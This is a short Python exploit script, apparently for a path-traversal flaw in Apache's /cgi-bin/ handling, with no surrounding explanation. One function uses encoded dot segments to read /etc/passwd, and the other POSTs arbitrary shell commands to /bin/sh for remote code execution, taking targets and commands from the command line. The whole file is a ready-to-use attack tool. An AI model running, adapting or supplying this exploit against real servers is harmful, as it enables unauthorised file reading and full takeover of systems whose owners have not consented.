import requests
import sys

def usage():
    print(f"Usage: python {sys.argv[0]} <target_url> [cmd]")
    print("Example:")
    print(f"  python {sys.argv[0]} http://192.168.56.101:80")
    print(f"  python {sys.argv[0]} http://192.168.56.101:80 whoami")
    sys.exit(1)

def check_lfi(target):
    lfi_payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
    url = target.rstrip("/") + lfi_payload
    print(f"[+] Checking for LFI: {url}")
    r = requests.get(url)
    if "root:x:" in r.text:
        print("[+] Target is vulnerable to LFI!")
        print(r.text)
    else:
        print("[-] Target does not seem vulnerable to LFI.")

def exploit_rce(target, cmd):
    rce_payload = "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
    url = target.rstrip("/") + rce_payload
    print(f"[+] Sending RCE payload: {url}")
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = f"echo; {cmd}"
    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print("[+] Command output:")
        print(r.text)
    else:
        print(f"[-] Exploit failed. HTTP {r.status_code}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        usage()

    target = sys.argv[1]
    if len(sys.argv) == 2:
        check_lfi(target)
    else:
        cmd = ' '.join(sys.argv[2:])
        exploit_rce(target, cmd)
